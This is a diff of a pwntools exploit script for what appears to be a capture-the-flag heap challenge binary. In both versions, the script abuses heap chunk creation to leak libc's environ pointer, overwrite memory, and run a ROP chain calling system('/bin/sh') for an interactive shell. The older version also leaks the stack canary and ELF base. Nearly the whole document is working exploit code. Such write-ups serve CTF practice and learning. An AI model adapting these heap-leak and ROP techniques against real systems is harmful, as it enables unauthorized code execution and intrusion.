@@ -1,12 +1,10 @@
 from pwn import *
 
-context.binary = elf = ELF('./challenge/chal_patched')
-libc = ELF("./challenge/libc.so.6")
+context.binary = elf = ELF('./chal')
+libc = ELF("./libc.so.6")
 
-# this could also be done with fsop probably
-
-# p = elf.process()
-p = remote("localhost", 1341)
+p = elf.process()
+# p = remote("localhost", 1341)
 assert p
 
 def do_create(index, size, password):
@@ -47,19 +45,17 @@ def setup_chunks(addr, size):
     do_create(0, size, b'AAAA')
     do_create(0, size, b'AAAA')
 
-def leak_addr(addr, size, cookie=False):
+def leak_addr(addr, size):
     setup_chunks(addr, size)
-    do_create(0, size, b'A'*(25 if cookie else 24))
+    do_create(0, size, b'A'*24)
     do_print(0)
     val = u64(p.recvline()[26:-1].ljust(8, b'\x00'))
-    if not cookie:
-        return val
+    return val
 
-    return val & ~0xFF
 
 def overwrite_addr(addr, value, size):
     setup_chunks(addr, size)
-    do_create(0, size, b'A'*16 + p64(value))
+    do_create(0, size, value)
 
 
 do_create(0, 0x450, b'AAAA')
@@ -81,24 +77,15 @@ environ = leak_addr(libc.symbols['environ'], 64)
 
 log.info(f"environ @ {hex(environ)}")
 
-elf.address = leak_addr(environ - 48, 32) - 0x10f5
-
-log.info(f"ELF @ {hex(elf.address)}")
-
-canary = leak_addr(environ - 18*8, 48, True)
-
-overwrite_addr(elf.symbols['is_admin'], 1, 88)
+rop_target = environ - 0x110
 
 r = ROP(libc)
+r.raw(p64(0))
+r.raw(r.find_gadget(["ret"]).address)
 r.system(next(libc.search(b'/bin/sh\x00')))
 
-chain = b'A'*24
-chain += p64(canary)
-chain += p64(0)
-chain += p64(r.find_gadget(["ret"]).address)
-chain += r.chain()
+overwrite_addr(rop_target, r.chain(), 88)
 
-
-do_edit(chain)
+p.sendlineafter(b'>', b'4')
 
 p.interactive()
